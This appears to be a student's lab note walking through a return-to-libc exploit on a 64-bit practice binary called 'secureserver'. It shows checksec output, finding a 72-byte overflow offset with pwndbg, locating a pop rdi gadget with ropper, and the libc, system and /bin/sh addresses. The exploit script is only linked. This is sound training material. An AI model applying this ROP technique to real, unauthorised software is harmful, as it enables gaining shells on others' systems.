[[Binary Exploitation/06 return to libc/x64/Source Code|Source Code]] 

### Basic File Checks

1. File -> `./secureserver: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f890ad80b62339e815e93e095690235d1466bfbb, for GNU/Linux 3.2.0, not stripped`
2. checksec ->
```python
[*] '/root/binary_exploitation/06/64/secureserver'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Manual Work

Now in 64 bit when we call the system function it looks in the RDI for the string which in our case is /bin/sh so we must find a pop_rdi gadget

But before that let's look for the offset

```python
cyclic 100
gdb-pwndb ./secureserver
```

```python
*RAX  0x7fffffffdca0 ◂— 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
*RBX  0x7fffffffde08 —▸ 0x7fffffffe1a9 ◂— '/root/binary_exploitation/06/64/secureserver'
*RCX  0x7ffff7f9ba80 (_IO_2_1_stdin_) ◂— 0xfbad2288
*RDX  0x1
*RDI  0x7ffff7f9da20 (_IO_stdfile_0_lock) ◂— 0x0
*RSI  0x1
*R8   0x405715 ◂— 0x0
 R9   0x0
*R10  0x1000
*R11  0x246
 R12  0x0
*R13  0x7fffffffde18 —▸ 0x7fffffffe1d6 ◂— 0x5245545f5353454c ('LESS_TER')
 R14  0x0
*R15  0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
*RBP  0x6161616161616169 ('iaaaaaaa')
*RSP  0x7fffffffdce8 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaa'
*RIP  0x401179 (receive_feedback+39) ◂— ret
```

The offset: `72`

```python
ropper --file ./secureserver --search=pop
```

Result:

```python
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: ./secureserver
0x0000000000401204: pop r12; pop r13; pop r14; pop r15; ret;
0x0000000000401206: pop r13; pop r14; pop r15; ret;
0x0000000000401208: pop r14; pop r15; ret;
0x000000000040120a: pop r15; ret;
0x0000000000401203: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x0000000000401207: pop rbp; pop r14; pop r15; ret;
0x0000000000401139: pop rbp; ret;
0x000000000040120b: pop rdi; ret;
0x0000000000401209: pop rsi; pop r15; ret;
0x0000000000401205: pop rsp; pop r13; pop r14; pop r15; ret;
```

Pop_rdi: `0x40120b`

Now we need to find the address of the libc, system and /bin/sh

We can find it the same way as in 32 bit

[[Binary Exploitation/06 return to libc/x86/Main#^5a9d22|libc]]
[[Binary Exploitation/06 return to libc/x86/Main#^a65e5c|System]]
[[Binary Exploitation/06 return to libc/x86/Main#^52a3ac|/bin/sh]]

libc: `0x00007ffff7dc9000`
system: `0x4c330`
/bin/sh: `0x196031`

Now let's create the python script
[[Binary Exploitation/06 return to libc/x64/Python Script|Python Script]]